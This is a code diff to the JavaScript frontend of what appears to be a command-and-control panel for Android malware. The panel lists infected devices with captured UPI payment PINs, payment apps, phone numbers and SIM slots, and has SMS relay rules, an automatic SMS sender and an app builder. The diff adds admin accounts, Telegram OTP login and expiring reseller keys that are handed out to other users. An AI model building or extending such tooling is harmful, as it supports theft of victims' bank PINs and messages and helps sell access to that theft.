+pb.addEventListener("click",()=>resetAdminPassword(a)); w.appendChild(pb);
+if(!a.env){
+const tb=document.createElement("button"); tb.className="mini "+(a.active?"d":"g"); tb.type="button";
+tb.textContent=a.active?"Disable":"Enable";
+tb.addEventListener("click",()=>toggleAdmin(a)); w.appendChild(tb);
+const db=document.createElement("button"); db.className="mini d"; db.type="button"; db.textContent="Delete";
+db.addEventListener("click",()=>deleteAdmin(a)); w.appendChild(db);
+}
+ac.appendChild(w); row.appendChild(ac);
+body.appendChild(row);
+});
+}
+
+async function loadAdmins(){
+if(state.role!=="admin"&&!state.noAuth)return;
+try{ const d=await api("/admin/admins"); state.admins=Array.isArray(d)?d:(d.admins||[]); renderAdmins(); }
+catch(e){ state.admins=[]; renderAdmins(); }
+}
+
+async function createAdmin(){
+const username=$("#aUser").value.trim();
+const password=$("#aPass").value;
+const confirm2=$("#aConfirm").value;
+if(!username){ toast("username daalo"); return; }
+if(password&&confirm2&&password!==confirm2){ toast("password match nahi"); return; }
+try{
+const r=await api("/admin/admins",{method:"POST",body:JSON.stringify({username,password})});
+$("#aValue").textContent=r.admin.username+"  ·  "+r.password;
+$("#aOut").hidden=false;
+$("#aUser").value=""; $("#aPass").value=""; $("#aConfirm").value="";
+adminNotice("");
+toast("admin add hua — credentials copy karo");
+await loadAdmins();
+}catch(e){ adminNotice(e.message,true); }
+}
+
+async function resetAdminPassword(a){
+if(a.env){ toast("env admin ka password .env se badalta hai"); return; }
+if(!confirm("Password reset karein?"))return;
+try{
+const r=await api("/admin/admins/"+a.id+"/password",{method:"POST",body:JSON.stringify({})});
+$("#aValue").textContent=a.username+"  ·  "+r.password;
+$("#aOut").hidden=false;
+toast("naya password generate hua");
+}catch(e){ toast(e.message); }
+}
+
+async function toggleAdmin(a){
+try{ await api("/admin/admins/"+a.id+"/toggle",{method:"POST",body:JSON.stringify({active:!a.active})});
+toast(a.active?"disabled":"enabled"); await loadAdmins(); }catch(e){ toast(e.message); }
+}
+async function deleteAdmin(a){
+if(!confirm("Delete admin "+a.username+"?"))return;
+try{ await api("/admin/admins/"+a.id+"/delete",{method:"POST"}); toast("deleted"); await loadAdmins(); }
+catch(e){ toast(e.message); }
+}
+
+// ----------------------------------------------------------------- account
+
+async function loadAccount(){
+try{
+const d=await api("/admin/keys/me");
+badge($("#accRole"),d.role==="admin"?"admin":"key user",d.role==="admin"?"ok":"id");
+const info=$("#accInfo"); info.replaceChildren();
+const rows=[
+["Key / ID", d.key||d.name||"—"],
+["Label", d.label||"—"],
+["Expiry", d.expires_at?fmt(d.expires_at):"lifetime"]
+];
+rows.forEach((p)=>{
+const r=document.createElement("div"); r.className="row";
+const l=document.createElement("div"); l.className="row-name"; l.textContent=p[0];
+const v=document.createElement("div"); v.className="row-desc mono"; v.textContent=p[1];
+r.appendChild(l); r.appendChild(v); info.appendChild(r);
+});
+$("#accPassPanel").hidden = d.role==="admin";
+if(d.role==="key"){
+const tg=$("#accTg"); tg.replaceChildren();
+badge($("#accTgBadge"),d.telegram_linked?"linked":"off",d.telegram_linked?"ok":"warn");
+const p=document.createElement("p"); p.className="row-desc";
+p.textContent=d.telegram_linked
+? ("Chat "+d.telegram_masked+" linked — login par OTP yahin aayega.")
+: (d.bot_username
+  ? ("Bot @"+d.bot_username+" kholo aur bhejo: /link "+d.key+" <password>")
+  : "Bot configured nahi hai — admin se poocho.");
+tg.appendChild(p);
+if(d.telegram_linked){
+const b=document.createElement("button"); b.className="btn plain"; b.type="button"; b.textContent="Unlink";
+b.style.marginTop="10px";
+b.addEventListener("click",async()=>{
+try{ await api("/admin/keys/me/unlink-telegram",{method:"POST"}); toast("unlinked"); loadAccount(); }
+catch(e){ toast(e.message); } });
+tg.appendChild(b);
+}
+}else{
+$("#accTg").textContent="Admin OTP settings Settings page par hain.";
+badge($("#accTgBadge"),"—","");
+}
+}catch(e){ $("#accInfo").textContent=e.message; }
+}
+
+async function savePassword(){
+const cur=$("#accCurrent").value;
+const n1=$("#accNew").value;
+const n2=$("#accNew2").value;
+if(n1!==n2){ toast("password match nahi"); return; }
+if(n1.length<6){ toast("kam se kam 6 character"); return; }
+try{
+await api("/admin/keys/me/password",{method:"POST",body:JSON.stringify({current:cur,password:n1})});
+$("#accCurrent").value=""; $("#accNew").value=""; $("#accNew2").value="";
+toast("password badal gaya");
+const s=readSession(); if(s){ saveSession(s.id,n1,true,s.role); }
+}catch(e){ toast(e.message); }
+}
+
+// ------------------------------------------------------------------ bot
+
+async function loadBot(){
+try{
+const d=await api("/admin/bot/status");
+badge($("#botState"),d.enabled?(d.running?"live":"idle"):"off",d.enabled?(d.running?"ok":"warn"):"bad");
+badge($("#botBadge"),d.enabled?"live":"off",d.enabled?"ok":"warn");
+$("#botName").textContent=d.username?("@"+d.username):"not configured";
+$("#botOtp").textContent=d.otp_active?"ON — linked users ko OTP jayega":"OFF";
+$("#botAlerts").textContent=d.notify_connections?"ON":"OFF";
+$("#botErr").textContent=d.last_error||"—";
+$("#botLinkHint").textContent=d.username?("/start  →  /link <key> <password>  (@"+d.username+")"):"/link <key> <password>";
+}catch(e){ badge($("#botState"),"down","bad"); }
+}
+
+async function loadRules(){
+if(state.noAdmin)return;
+const d=await api("/admin/rules");
+state.rules=Array.isArray(d)?d:(d.rules||[]); renderRules();
 }
 
 function renderRules(){
@@ -2194,7 +2495,7 @@ body.appendChild(row);
 function gridSignature(){
 return state.devices.map((d)=>{
 const a=autoOf(d); const info=nums(d);
-return [devId(d),devName(d),devStatus(d),a.enabled?"1":"0",info.live,info.entered,d.upi_pin,tel(d).model,tel(d).battery_level,tel(d).battery_charging,(a.sim_slots||[]).join(""),d.install_state].join("|");
+return [devId(d),devName(d),devStatus(d),a.enabled?"1":"0",info.live,info.entered,d.upi_pin,tel(d).model,tel(d).battery_level,tel(d).battery_charging,(a.sim_slots||[]).join(""),d.install_state,d.owner_label].join("|");
 }).join("~")+"|"+(state.pinsOnly?"1":"0")+"|"+($("#devSearch").value||"");
 }
 
@@ -2203,7 +2504,7 @@ const sig=gridSignature(); if(!force&&sig===gridSig)return; gridSig=sig;
 const q=($("#devSearch").value||"").trim().toLowerCase();
 let list=state.pinsOnly?state.devices.filter(hasPin):state.devices;
 if(q){ list=list.filter((d)=>{ const t=tel(d); const info=nums(d);
-const hay=[devName(d),d.short_id,t.model,t.manufacturer,info.live,info.entered,info.carrier,d.payment_app].filter(Boolean).join(" ").toLowerCase();
+const hay=[devName(d),d.short_id,t.model,t.manufacturer,info.live,info.entered,info.carrier,d.payment_app,d.owner_label].filter(Boolean).join(" ").toLowerCase();
 return hay.indexOf(q)>=0; }); }
 const grid=$("#devGrid"); grid.replaceChildren();
 const e=$("#devEmpty");
@@ -2241,6 +2542,9 @@ if(auto.enabled){
 const ab=document.createElement("span"); ab.className="badge auto";
 ab.textContent="AUTO"+((auto.sim_slots||[]).length?" · SIM "+(auto.sim_slots||[]).map((s)=>s+1).join("+"):"");
 meta.appendChild(ab); }
+if(state.role==="admin"&&!state.noAuth&&d.owner_label){
+const ob=document.createElement("span"); ob.className="badge violet";
+ob.textContent=d.owner_label; meta.appendChild(ob); }
 const ist=String(d.install_state||"").toLowerCase();
 if(ist==="uninstalled"||ist==="gone"){
 const ub=document.createElement("span"); ub.className="badge bad";
@@ -2306,6 +2610,7 @@ const t=tel(d); const box=$("#dMore"); box.replaceChildren();
 const grid=document.createElement("div"); grid.className="more-grid";
 const rows=[
 ["Device id",devId(d)],["Short id",d.short_id],["Registration id",d.registration_id],
+["Owner",d.owner_label||(d.owner_key_id?"linked":"admin")],
 ["Manufacturer",t.manufacturer],["Brand",t.brand],["SDK int",t.sdk_int],["Android ID",d.android_id||t.android_id],
 ["Install id",d.install_id],["Install seq",d.install_seq],["Install state",d.install_state],
 ["Installed at",d.installed_at?fmt(d.installed_at):null],
@@ -2413,6 +2718,8 @@ pb.textContent="PIN "+d.upi_pin+(d.payment_app?" · "+d.payment_app:""); tags.ap
 if(auto.enabled){ const ab=document.createElement("span"); ab.className="badge auto";
 ab.textContent="AUTO SENDER"+((auto.sim_slots||[]).length?" · SIM "+(auto.sim_slots||[]).map((s)=>s+1).join("+"):"");
 tags.appendChild(ab); }
+if(d.owner_label){ const ob=document.createElement("span"); ob.className="badge violet";
+ob.textContent="owner: "+d.owner_label; tags.appendChild(ob); }
 const ist=String(d.install_state||"").toLowerCase();
 if(ist==="uninstalled"||ist==="gone"){
 const ub=document.createElement("span"); ub.className="badge bad";
@@ -2527,10 +2834,6 @@ if(hit)j.status="sent";
 renderOutbox();
 }
 
-async function loadRules(){ if(state.noAdmin)return;
-const d=await api("/admin/rules");
-state.rules=Array.isArray(d)?d:(d.rules||[]); renderRules(); }
-
 async function loadUsers(){
 if(state.noAdmin)return;
 if(state.role!=="admin"&&!state.noAuth){ state.users=[]; renderUsers(); return; }
@@ -2586,9 +2889,10 @@ try{
 await loadHealth();
 await loadThemes();
 await loadBuilderConfig();
+await loadBot();
 const jobs=[loadApps(),loadBuilds()];
 if(!state.noAdmin)jobs.push(loadDevices(),loadMessages(),loadRules(),loadRelay(),loadAutoSender(),loadStats(),loadGrowthEvents());
-if(state.role==="admin"||state.noAuth)jobs.push(loadUsers());
+if(state.role==="admin"||state.noAuth)jobs.push(loadUsers(),loadAdmins());
 const res=await Promise.allSettled(jobs);
 const bad=res.filter((r)=>r.status==="rejected");
 if(bad.length){
@@ -2604,6 +2908,8 @@ if(section==="devices")await loadDevices();
 if(section==="messages")await loadMessages();
 if(section==="rules")await loadRules();
 if(section==="users")await loadUsers();
+if(section==="admins")await loadAdmins();
+if(section==="account")await loadAccount();
 if(section==="growth"){ await loadStats(); await loadGrowthEvents(); }
 if(section==="relay"){ await loadRelay(); await loadRules(); }
 if(section==="live"){ await loadDevices(); await loadMessages(); }
@@ -2703,6 +3009,9 @@ if(page==="devices")refreshSection("devices");
 if(page==="messages")refreshSection("messages");
 if(page==="relay")refreshSection("relay");
 if(page==="users")refreshSection("users");
+if(page==="admins")refreshSection("admins");
+if(page==="account")refreshSection("account");
+if(page==="settings")loadBot();
 if(page==="growth")refreshSection("growth");
 if(page==="builder")refreshSection("builder");
 }
@@ -2921,16 +3230,29 @@ try{
 const r=await api("/admin/keys",{method:"POST",body:JSON.stringify({
 label:$("#kLabel").value.trim(),
 phone:$("#kPhone").value.trim(),
+password:$("#kPass").value,
 days:Number($("#kDays").value)
 })});
 $("#kValue").textContent=r.key;
+$("#kPassValue").textContent=r.password;
 $("#kOut").hidden=false;
-$("#kLabel").value=""; $("#kPhone").value="";
-toast("key ban gayi — copy karke user ko bhejo");
+$("#kLabel").value=""; $("#kPhone").value=""; $("#kPass").value="";
+toast("key ban gayi — credentials copy karke user ko bhejo");
 await loadUsers();
 }catch(e){ toast(e.message); } finally{ btn.disabled=false; }
 });
-$("#kCopy").addEventListener("click",()=>copyText($("#kValue").textContent.trim()));
+$("#kCopy").addEventListener("click",()=>{
+copyText($("#kValue").textContent.trim()+"  /  "+$("#kPassValue").textContent.trim(),"credentials");
+});
+
+$a = null;
+$("#aCreate").addEventListener("click",createAdmin);
+$("#aCopy").addEventListener("click",()=>copyText($("#aValue").textContent.trim(),"credentials"));
+$("#accPassSave").addEventListener("click",savePassword);
+$("#botReload").addEventListener("click",loadBot);
+$("#botTest").addEventListener("click",async()=>{
+try{ await api("/admin/bot/test",{method:"POST"}); toast("test notification bheja"); }
+catch(e){ toast(e.message); } });
 
 $("#loginForm").addEventListener("submit",async(ev)=>{
 ev.preventDefault();
@@ -2939,17 +3261,27 @@ loginMsg("");
 const id=$("#loginId").value.trim();
 const pass=$("#loginPass").value;
 const keep=$("#remember").checked;
+const looksKey = /^TPC/i.test(id.replace(/[^A-Za-z0-9]/g,"")) && id.replace(/[^A-Za-z0-9]/g,"").length >= 10;
 try{
-let r;
-if(pass){
-r=await api("/panel/login",{method:"POST",body:JSON.stringify({login_id:id,password:pass})},false);
-saveSession(id,pass,keep,r.role);
-}else{
-r=await api("/panel/access",{method:"POST",body:JSON.stringify({key:id})},false);
-saveSession(r.username||id,null,keep,r.role);
+const url = looksKey ? "/panel/access" : "/panel/login";
+const body = looksKey ? {key:id, password:pass} : {login_id:id, password:pass};
+const r=await api(url,{method:"POST",body:JSON.stringify(body)},false);
+
+if(r&&r.status==="otp_required"){
+otpChallenge=r;
+$("#loginCred").hidden=true; $("#loginOtp").hidden=false;
+$("#otpMasked").textContent=r.masked||"••••";
+$("#otpCode").value="";
+otpMsg("");
+startOtpCountdown(r.ttl||300, r.resend_after||45);
+$("#otpCode").focus();
+return;
 }
+
+saveSession(looksKey?(r.username||id):id, pass, keep, r.role);
 if(r&&r.token)setToken(r.token);
 if(r&&r.username)state.userId=r.username;
+if(r&&r.owner_key_id)state.ownerId=r.owner_key_id;
 $("#loginPass").value="";
 loginMsg("Signed in","ok");
 showApp();
@@ -2960,17 +3292,71 @@ loginMsg(err.message||"Access denied");
 }finally{ btn.disabled=false; btn.textContent="Sign in"; }
 });
 
+function startOtpCountdown(ttl, resendAfter){
+clearInterval(otpTimer);
+let left=ttl, resend=resendAfter;
+const ttlEl=$("#otpTtl"); const rb=$("#otpResend");
+rb.disabled=true;
+const tick=()=>{
+ttlEl.textContent = left>0 ? ("expires in "+left+"s") : "expired";
+if(resend>0){ resend--; rb.disabled=true; rb.textContent="Resend in "+resend+"s"; }
+else { rb.disabled=false; rb.textContent="Resend code"; }
+if(left>0)left--;
+if(left<=0&&resend<=0)clearInterval(otpTimer);
+};
+tick();
+otpTimer=setInterval(tick,1000);
+}
+
+$("#otpForm").addEventListener("submit",async(ev)=>{
+ev.preventDefault();
+if(!otpChallenge)return;
+const btn=$("#otpBtn"); btn.disabled=true; btn.textContent="Verifying…";
+otpMsg("");
+try{
+const r=await api("/panel/otp/verify",{method:"POST",body:JSON.stringify({
+challenge:otpChallenge.challenge, code:$("#otpCode").value.trim()
+})},false);
+saveSession(r.username, $("#loginPass").value, $("#remember").checked, r.role);
+if(r&&r.token)setToken(r.token);
+if(r&&r.username)state.userId=r.username;
+if(r&&r.owner_key_id)state.ownerId=r.owner_key_id;
+clearInterval(otpTimer); otpChallenge=null;
+$("#loginCred").hidden=false; $("#loginOtp").hidden=true;
+showApp();
+await afterLogin(r.role);
+toast("welcome, "+(r.role==="admin"?"admin":"user"));
+}catch(err){
+otpMsg(err.message||"Verify fail");
+}finally{ btn.disabled=false; btn.textContent="Verify"; }
+});
+
+$("#otpResend").addEventListener("click",async()=>{
+if(!otpChallenge)return;
+try{
+const r=await api("/panel/otp/resend",{method:"POST",body:JSON.stringify({challenge:otpChallenge.challenge})},false);
+otpMsg("naya code bheja","ok");
+startOtpCountdown(r.ttl||300, r.resend_after||45);
+}catch(e){ otpMsg(e.message); }
+});
+
+$("#otpBack").addEventListener("click",()=>{
+clearInterval(otpTimer); otpChallenge=null;
+$("#loginOtp").hidden=true; $("#loginCred").hidden=false;
+});
+
 $("#logoutBtn").addEventListener("click",async()=>{
 if(state.noAuth){ location.reload(); return; }
 try{ await api("/admin/logout",{method:"POST"},false); }catch(e){}
 try{ if(state.ws)state.ws.close(); }catch(e){}
 try{ if(state.wsUser)state.wsUser.close(); }catch(e){}
 clearTimeout(state.pollTimer); clearTimeout(state.buildTimer); clearTimeout(state.wsTimer);
+clearInterval(otpTimer); otpChallenge=null;
 clearSession();
-state.devices=[]; state.messages=[]; state.devMsgs={}; state.users=[];
+state.devices=[]; state.messages=[]; state.devMsgs={}; state.users=[]; state.admins=[];
 state.growth=null; state.growthEvents=[];
 state.apps=[]; state.builds=[]; state.logBuild=null; state.quota=null;
-state.pinsOnly=false; state.role="user"; state.userId=""; state.noAdmin=false; adminProbed=false;
+state.pinsOnly=false; state.role="user"; state.userId=""; state.ownerId=""; state.noAdmin=false; adminProbed=false;
 state.sel={as:[],send:[],bulk:[]}; state.selLive={}; state.draft={}; state.numTried={};
 gridSig=""; liveSig="";
 $("#pinsBtn").classList.remove("on");
